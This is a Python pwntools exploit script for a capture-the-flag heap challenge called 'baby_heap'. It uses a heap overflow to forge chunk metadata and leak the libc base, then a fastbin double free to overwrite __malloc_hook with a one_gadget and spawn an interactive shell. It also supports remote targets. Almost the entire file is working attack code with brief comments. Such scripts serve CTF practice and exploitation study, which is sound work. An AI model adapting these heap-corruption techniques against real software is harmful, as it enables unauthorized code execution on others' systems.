#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('baby_heap')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
dir /home/mark/Desktop/BinExp/Challs/HEAP/0CTF.S/glibc
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io
    
    io = start()


def allocate(size: int) -> int:
    io.sendlineafter(b"Command", b"1")
    io.sendlineafter(b"Size:", str(size).encode())
    io.recvuntil(b"Index ")
    idx = int(io.recvline().strip())
    return idx


def fill(idx: int, size: int, content: bytes) -> None:
    io.sendlineafter(b"Command", b"2")
    io.sendlineafter(b"Index:", str(idx).encode())
    io.sendlineafter(b"Size:", str(size).encode())
    io.sendafter(b"Content:", content)


def free(idx: int) -> None:
    io.sendlineafter(b"Command", b"3")
    io.sendlineafter(b"Index:", str(idx).encode())


def dump(idx: int) -> bytes:
    io.sendlineafter(b"Command", b"4")
    io.sendlineafter(b"Index:", str(idx).encode())
    io.recvuntil(b"Content: \n")
    data = io.recvline()
    return data

def solve():

    """
    Info leaks:
        - Heap consolidation to get libc infoleak
        - Fastbin attack to write one gadget in malloc hook
    """

    chunkA = allocate(0xf0)
    chunkB = allocate(0x70)
    chunkC = allocate(0xf0)
    chunkD = allocate(0x30)

    free(chunkA) # unsorted bin
    free(chunkB) # fast bin

    """
    Use heap overflow to change chunkC prev_size to chunkB->size + chunkA->size thus on free it will consolidate to chunkA and forgets about chunkB
    """
    
    chunkB = allocate(0x78)
    
    overwrite = p64(0) * 14 + p64(0x180) + p64(0x100)
    fill(chunkB, len(overwrite), overwrite)
    free(chunkC)

    """
    Allocate chunkA->size to shrink the unsorted bin to chunkB, doing so will update chunkB fd/bk to the main_arena struct 
    """

    chunk_pad = allocate(0xf0)
    main_arena = u64(dump(chunkB)[:8]) - 0x58
    libc.address = main_arena - libc.sym["main_arena"]
    info("libc base: %#x", libc.address)
    free(chunk_pad)

    """
    Double free on fastbin:
    - Allocate from unsorted bin such that after shrink the next allocation returns pointer to chunkB 
    """

    df_chunk = chunkB

    chunkA = allocate(0x10)
    chunkB = allocate(0x60)
    chunkC = allocate(0x60)
    chunkD = allocate(0x60)

    free(chunkD)
    free(chunkC)
    free(df_chunk)

    hook = libc.sym["__malloc_hook"] - 0x23
    one_gadget = libc.address + 0x4526a

    chunkB = allocate(0x60)
    fill(chunkB, 8, p64(hook))    

    for i in range(2):
        allocate(0x60)
    
    target = allocate(0x60)
    data = b"A" * 19 + p64(one_gadget)
    fill(target, len(data), data)

    io.sendline(b"1")
    io.sendline(b"20")

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

